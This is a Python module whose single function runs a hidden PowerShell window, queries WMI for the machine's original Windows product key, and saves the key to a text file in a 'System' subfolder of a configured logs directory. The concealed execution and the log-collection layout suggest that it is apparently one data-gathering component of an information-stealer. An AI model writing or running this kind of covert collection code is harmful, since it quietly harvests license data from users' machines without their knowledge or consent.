from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, check_output
from os import environ
from manager.logger import Log
from preferences.config import config

def ProductKey():
    user = environ['USERPROFILE']
    pathToLogs = f'{user}\\{config.pathToLogs}\\System\\productkey.txt'
    try:
        startupinfo = STARTUPINFO()
        startupinfo.dwFlags |= STARTF_USESHOWWINDOW
        result = check_output(
            ['powershell', '-Command', '(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey'],
            text=True,
            startupinfo=startupinfo
        )
        output = result.strip()
    except Exception as e:
        Log(f"ProductKey ---> {e}")
        return

    if output:
        with open(pathToLogs, 'w', encoding='UTF-8') as f:
            f.write(output)
